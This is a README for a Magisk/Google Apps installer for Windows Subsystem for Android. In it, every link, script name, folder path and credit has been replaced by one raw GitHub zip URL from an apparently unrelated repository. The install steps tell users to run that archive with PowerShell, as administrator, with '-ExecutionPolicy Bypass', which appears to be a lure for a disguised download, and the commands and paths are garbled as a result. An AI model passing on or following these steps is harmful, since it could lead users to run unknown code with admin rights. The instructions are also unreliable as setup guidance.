# Magisk on WSA (with Google Apps)

## Pre-request

- Ubuntu (you can use WSL2)

## Features

- Integrate Magisk and OpenGApps in a few clicks within minutes
- Keep each build up to date
- Support both ARM64 and x64
- Support all OpenGApps variants except for aroma (aroma does not support x86_64, please use super instead)
- Fix VPN dialog not showing (use our [VpnDialogs app](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip))
- Unattended installation
- Automatically activates developers mode in Windows 11
- Update to the new version while preserving data with a one-click script
- Merged all language packs
- Support managing start menu icons (manually installing [WSAHelper](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip) to use this feature)

## Text Guide

1. Star (if you like)
1. Clone the repo to local
1. Run `https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip`
1. Select the version of Magisk and select the [OpenGApps variant](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip) you like, select the root solution (none means no root), select the WSA version and its architecture (mostly x64)
1. Wait for the script to complete and the artifact will be in the `output` folder

1. Move the artifact to a place you like
1. Right-click `https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip` and select `Run with PowerShell`
    - If you previously have a MagiskOnWSA installation, it will automatically uninstall the previous one while **preserving all user data** and install the new one, so don't worry about your data.
    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip\LocalCache\https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip` before uninstallation and restore it after installation.) (If you want to restore the icons to the start menu, please install and use [WSAHelper](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip).)
    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip` as administrator:
        1. Press `Win+x` and select `Windows Terminal (Admin)`
        2. Input `cd "{X:\path\to\your\extracted\folder}"` and press `enter`, and remember to replace `{X:\path\to\your\extracted\folder}` including the `{}`, for example `cd "D:\wsa"`
        3. Input `https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip` and press `enter`
        4. The script will run and WSA will be installed
        5. If this workaround does not work, your PC is not supported for WSA
1. Magisk/Play store will be launched. Enjoy by installing LSPosed-zygisk with zygisk enabled or Riru and LSPosed-riru

## FAQ

- Can I delete the installed folder?

    No.
- How can I update WSA to a new version?

    Delete the `download` folder
    Rerun the script, replace the content of your previous installation and rerun `https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip`. Don't worry, your data will be preserved.
- How can I get the logcat from WSA?

    `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip\LocalState\diagnostics\logcat`
- How can I update Magisk to a new version?

    Do the same as updating WSA
- How to pass safetynet?

    Like all the other emulators, no way.
- Virtualization is not enabled?

    `https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip` helps you enable it if not enabled. After rebooting, rerun `https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
- How to remount the system as read-write?

    No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip Ask Google for help.
- I cannot `adb connect localhost:58526`

    Make sure developer mode is enabled. If the issue persists, check the IP address of WSA on the setting page and try `adb connect ip:5555`.
- Magisk online module list is empty?

    Magisk actively removes the online module repository. You can install the module locally or by `adb push https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip`.
- Can I use Magisk 23.0 stable or a lower version?

    No. Magisk has bugs preventing itself from running on WSA. Magisk 24+ has fixed them. So you must use Magisk 24 or higher version.
- How can I get rid of Magisk?

    Choose `none` as the root solution.
- Github script is updated, how can I synchronize it?

    1. In your fork repository, click `fetch upstream`
        ![fetch](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip)
    1. Then click `fetch and merge`
        ![merge](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip)

## Credits

- [StoreLib](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip): API for downloading WSA
- [Magisk](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip): The most famous root solution on Android
- [The Open GApps Project](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip): One of the most famous Google Apps packages solution
- [WSA-Kernel-SU](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip) and [kernel-assisted-superuser](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip): The kernel `su` for debugging Magisk Integration
- [WSAGAScript](https://raw.githubusercontent.com/rbm30/MagiskOnWSALocal/main/arm64/MagiskOnWSALocal-v3.0.zip): The first GApps integration script for WSA
